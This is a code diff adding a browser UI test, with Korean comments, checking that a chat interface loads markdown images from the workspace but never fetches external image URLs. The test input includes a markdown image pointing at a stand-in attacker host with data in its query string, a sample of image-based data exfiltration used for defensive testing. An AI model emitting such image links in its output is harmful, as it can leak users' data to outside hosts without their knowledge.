@@ -195,3 +195,37 @@ def test_agent_waiting_line_shows_a_mini_thumbnail_without_expanding(stack, page
     )
     assert info["mini"] == 1, info
     assert info["bigHidden"] is True, info  # 큰 썸네일은 펼침 본문에 그대로
+
+
+def test_markdown_image_loads_from_workspace_and_external_never_fetches(
+    stack, page, ws
+):
+    """v10.64.0: ``![](path)`` 는 작업 폴더에서 실제로 로드되고, 외부 URL 그림은
+    링크로만 남아 **요청이 한 번도 나가지 않는다**(보는 것만으로 새는 길 차단)."""
+    (ws / "shot.png").write_bytes(_png_bytes())
+    outbound: list[str] = []
+    page.route(
+        "https://evil.example/**",
+        lambda route: (outbound.append(route.request.url), route.abort()),
+    )
+    stack.emit_ready()
+    page.goto(stack.url)
+    page.wait_for_selector("#attach", timeout=8000)
+    stack.renderer.push_user_message(
+        "[dj]: chart ![chart](shot.png) and ![leak](https://evil.example/p.png?d=s)",
+        author="dj",
+    )
+    page.wait_for_selector("#messages .card-user .bubble img.md-img", timeout=8000)
+    assert _wait(
+        lambda: page.evaluate(
+            "() => { const i = document.querySelector('#messages .card-user img.md-img');"
+            " return i.complete && i.naturalWidth === 64; }"
+        )
+    ), "마크다운 그림이 작업 폴더에서 로드되지 않았다"
+    link = page.evaluate(
+        "() => { const a = document.querySelector('#messages .card-user a.md-img-link');"
+        " return a && [a.getAttribute('href'), a.textContent]; }"
+    )
+    assert link == ["https://evil.example/p.png?d=s", "🖼 leak"]
+    page.wait_for_timeout(300)
+    assert outbound == []
